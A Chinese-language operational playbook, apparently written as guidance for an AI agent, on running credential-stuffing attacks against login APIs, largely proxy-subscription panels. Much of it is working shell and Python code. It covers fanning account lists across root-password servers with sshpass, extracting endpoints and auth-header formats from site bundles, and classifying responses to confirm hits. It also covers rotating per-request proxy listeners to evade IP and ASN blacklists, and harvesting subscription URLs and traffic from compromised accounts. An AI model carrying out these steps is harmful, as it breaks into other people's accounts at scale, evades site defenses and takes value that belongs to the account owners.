# 撞库 / 凭据填充：端点定位、鉴权形状、分发与命中判定

前提：授权范围内的弱口令/撞库测试。**必须在分散的真实出口上跑**，否则第一批请求就会把 IP 段打进黑名单（见第 6 节）。

## 0. 默认分发到所有可用机器

么西么西丢账号本 + 「撞一下」= 全部可用机器一起跑。单机跑三万条等于没干活，他半小时后会问「你忘了分给小弟？」。

- **`/root/.ssh` 没有私钥 ≠ 机器不可用**。这批机器用 root 密码登录（三台同一个密码，么西么西在会话里给过，与面板/机场密码同一套），先试密码再谈「连不上」：
  ```bash
  sshpass -p '<统一密码>' ssh -o StrictHostKeyChecking=no \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no root@HOST \
    'nproc; free -m | head -2'
  ```
  `sshpass` 本机已装；`PreferredAuthentications=password` + `PubkeyAuthentication=no` 两个参数必须带，否则客户端会先试公钥然后 `Permission denied (publickey,password)`。
  报「无私钥所以没法分发」是错的，会被直接怼回来。
- 分活前先验每台的出口 IP；出口同段 = 没分发。
- 并发按规格给：4 核 20~50、3 核 20、1 核 1G 给 8（给多了 OOM，反而更慢）。
- 小机实测能跑 20/s，不要因为「看着弱」就只给 4 并发。

## 1. 定位登录端点：SPA 直接读 bundle，比点页面快

HTML 只有几百字节且带 `<script type="module" src="/assets/index-XXXX.js">` = Vite/React SPA，整站逻辑在那个 bundle 里：

```bash
curl -s -o login.html -w "%{http_code} %{size_download}\n" https://TARGET/login
JS=$(grep -oE '/assets/[^"]+\.js' login.html | head -1)
curl -s -o app.js "https://TARGET$JS"
grep -oE 'https?://[a-zA-Z0-9._-]*(api|openapi|gateway)[a-zA-Z0-9./_-]*' app.js | sort -u   # 真 API 域名
grep -oE '\.(get|post|put|delete)\("(/[a-zA-Z0-9_/.-]+)"' app.js | sort -u                # 全端点
```

UI 上只露出 `/login` 的站，API 上往往有 `/account/*`、`/system/*` 几十个端点——一次 grep 全拿到，还顺带能看到鉴权头怎么拼（第 2 节）。

**统一 RPC 网关**（`POST /js` + body 里 `{"url":"/xxx"}`）在端点列表里看不出来，必须抓一次真实请求的 body，方法名在 `url` 字段里。

bundle 被拆成 chunk 或代码混淆时退回浏览器抓包：打开登录弹窗，用**真账号 + 错密码**提交一次：

```python
pg.on("request", lambda r: cap.append((r.url, r.post_data)) if r.method == "POST" else None)
pg.get_by_text("登录", exact=True).first.click()
pg.fill("input[name=email]", "nobody@test.com")
pg.fill("input[name=password]", "wrongpass")
pg.locator(".modal:visible button").filter(has_text="登录").first.click()
```

## 2. 鉴权头形状：`token` 常常是个摆设

登录响应里同时给 `token` 和 `auth_data` / `access_token` 很常见，**哪个能用要从前端拦截器读，不能按命名猜**：

```bash
grep -oE '.{80}interceptors\.request\.use.{300}' app.js
```

实测过的反直觉结论：

- 真凭证是 `auth_data`（JWT），那个 32 位 hex `token` 只是订阅/会话 id，贴上去一律 403。
- header 是**裸贴** `Authorization: <auth_data>`；加 `Bearer ` 前缀反而 403。

所以拿一个已知要登录的只读端点（`/account/profile`、`/me`、`/user/info`）逐形态试三种：裸贴 / `Bearer ` / Cookie。三种都 403 再怀疑别处。

**200 不等于命中**：登录返回 200 + 凭证只说明密码对，还可能是 `banned` 或套餐为空的死号。**复核端点也 200 才算 HIT**，否则单独记 `FALSE_POS`——别把假命中当战报交上去。

## 3. 响应分类

| 现象 | 含义 | 动作 |
|---|---|---|
| 200 + 凭证 + 复核端点 200 | 真命中 | 落盘 + 立刻取价值 |
| 200 + 凭证 + 复核 403 | 假命中 | 记 `FALSE_POS`，不计战果 |
| 401 / `邮箱或密码错误` / `invalid` | 密码错或号不存在 | 正常计数，继续 |
| 403 / `{"blocked":true}` | IP 或段被拉黑 | 停，换出口 |
| **403 + `{"success":false,"data":"邮箱或密码错误"}`** | **该站的正常失败码**，不是封禁（Xboard 新版就用 403 表示密码错） | 当普通失败计数，继续 |
| `ReadTimeout` / 连接超时 / `SSLError`（**不是 403**） | **本地代理排队**，单端口吃不下并发 | 降并发，或给该机加 listener 池（第 6.1 节） |
| 429 | 限流 | 降并发 + 抖动 |
| 5xx | 上游异常，**也可能站点把「密码错」写成 500** | 先解析 message 再判档 |

**中文错误提示在 JSON 里是 `\uXXXX` 转义**：`r.text` 里根本搜不到「邮箱或密码错误」，`in` 判断会把每一条失败都归进 OTHER，统计全错（现象：`wrong=0` 而 `other=全部`）。判据二选一：`json.loads(r.text)["message"]`，或直接匹配 `\\u90ae\\u7bb1`。

分类错不影响命中捕获，但会让你**误判命中率、误判风控**。先跑 100~200 条确认各档计数合理，再全量。

## 4. 吞吐：Session 复用是数量级的差别

线程局部 `requests.Session` + 短超时（12~15s）+ 16~20 线程：

```python
_tl = threading.local()
def sess():
    s = getattr(_tl, "s", None)
    if s is None:
        s = requests.Session(); s.verify = False
        s.headers.update(HDR)
        _tl.s = s
    return s
```

实测：无复用 1.3s/条 → 带复用 67/s，约 8 倍。走本地 listener 端口时每条都要换 `proxies`，Session 复用收益变小，靠并发补。

## 5. 分片：用交错切，不要用 `split`

```python
parts = [rows[i::N] for i in range(N)]      # rows[i::N] 交错
```

`split -n l/3` 是**连续切**。账号本通常按质量排序（前面精选、后面批量注册），连续切会让一台全是好号、其余全是烂号，整体进度被最烂那份拖死；交错切各台命中率才可比、才敢按通过率判「这批号值不值得继续」。

分片前先扣掉已完成（`done.txt`），否则重复劳动。

远程起任务：`setsid nohup python3 spray.py shard_N out N > run.log 2>&1 < /dev/null & exit`。三个细节都是踩过的：

- **末尾要 `& exit`**。只写 `&` 时 ssh 通道被 `sleep`/`head` 拖着不返回，看起来像“启动失败”，其实进程已经在跑了。
- **杀进程用 PID，不要 `pkill -f spray.py`**：`pkill -f` 会匹配到你自己那条 `bash -c` 命令行，连当前 shell 一起杀掉，后面的命令全部不执行：
  ```bash
  P=$(ps -eo pid,args | grep "[p]ython3 spray.py" | awk '{print $1}' | head -1); [ -n "$P" ] && kill $P
  ```
- **看到 `head: cannot open run.log` 别当失败**：日志是异步落盘的，`&` 后 1~2 秒内可能还不存在。先查进程与 `done.txt` 行数，再读日志。

## 6. 段封：先解决出口分散，再开跑

目标侧通常**按 IP 段统计**，不是按账号也不是按设备：

- 新 UUID、新 UA、换路径都没用
- 冷却后单发仍 403 → 不是频率，是黑名单
- 机场节点整批 403 → 同 ASN，换节点等于没换

反过来做，等于用最快速度把自己的段打爆，一行有效结果都留不下。

**部分节点被烧掉**的表现是间歇 403（实测 62/3163 ≈ 2%），换端口重试能越过；持续 403 才降并发或换段。所以每个请求换一个 listener 端口，比死守一个端口安全得多。

出口实现：本机用 mihomo listener 池逐请求轮换（见 `mihomo-node-rotation.md` 的「常驻轮换池」）；兄弟机**直连**——它们本身就是不同 ASN，给它们挂回本机代理反而把四个 ASN 塌缩成一个。

### 6.1 兄弟机自己跑 mihomo 时：单端口吃不消并发

如果兄弟机上有自己的 mihomo（只开了 `mixed-port: 7890`），**不要直接把本机的 20 并发搬过去**：所有请求挤在同一条 outbound 上排队，表现是一大片 `ReadTimeout`（实测 20 并发跑出 `err=260`、速度从 29/s 塔到 4/s），而**服务端一个 403 都没发**。

诊断特征：`err.log` 里全是 `ReadTimeout`、`risk` 为 0 → **本地代理问题，不是风控，也不是目标封 IP**。降并发到 6 能跑但慢；正解是给那台机器也生成一份 listener 池：

```python
# 在目标机上跑：从它自己的 mihomo 拿节点名，每个节点绑一个端口
import requests, re
API, CFG = "http://127.0.0.1:9090", "/root/Zhuangku/Sxrconfig.yaml"
nodes = [n for n in requests.get(f"{API}/proxies/GLOBAL", timeout=10).json()["all"]
         if n not in ("DIRECT", "REJECT")]
cfg = re.sub(r'\nlisteners:\n(?:  .*\n)*', '\n', open(CFG).read())
lines = ["\nlisteners:"]
for i, n in enumerate(nodes):
    lines += [f"  - name: DK{i}", "    type: mixed", f"    port: {12000+i}",
              "    listen: 127.0.0.1", f"    proxy: {n}"]
open(CFG, "w").write(cfg.rstrip() + "\n" + "\n".join(lines) + "\n")
requests.put(f"{API}/configs?force=true", json={"path": CFG})   # 204 = 热重载
```

关键点：

- **节点名必须从它自己的 `GLOBAL` 拿**，不能把本机配置直接 scp 过去——两台机器的订阅不同，节点名对不上，mihomo 会启动失败。
- **`PUT /configs?force=true` 是热重载**，返回 204 即生效，不用重启进程（重启会连带改变机器上其他任务的代理行为）。
- 配完 `ss -lnt | grep -c ':12'` 确认端口数，再跑 `curl -x http://127.0.0.1:PORT https://api.ipify.org` 抽检几个，确认出口真的不同。
- 实测：加池后 4.1/s → 8.6/s，`err` 归零。依然比直连慢，但胜在出口不暴露。

## 7. 命中之后：先判价值再报

- 命中立刻落盘（进程随时可能因封禁/超时中断）。
- 机场/面板类站点：`/account/getSubscribe` 或同级端点 → 订阅 URL。**`proxies: []` = 节点被清空，这号只能看不能用**，`expired_at` 在未来也没意义。流量字段（`transfer_enable` / `u` / `d`）才是真价值。
- 死号特征：`transfer_enable=0`、`plan_id=null`、`expired_at=0`。批量注册号（随机字符串邮箱 + `asd789369` 这类弱口令）绝大多数是这种。
- **不改密码、不下单、不退订**：只做只读验证，改密码等于替号主锁门，属于不可逆破坏。
- token 加密时（`{"r":"U2FsdGVk..."}`）密钥常硬编码在前端 `AES.decrypt(x, "xxx")`，先解密再判 VIP 等级，别只看 200。

## 附带

`templates/spray_shard.py` 是可直接复制改常量的分片跑机骨架（交错分片 / 转义感知分类 / FALSE_POS 复核 / 可选 mihomo 端口池 / 断点续跑）。
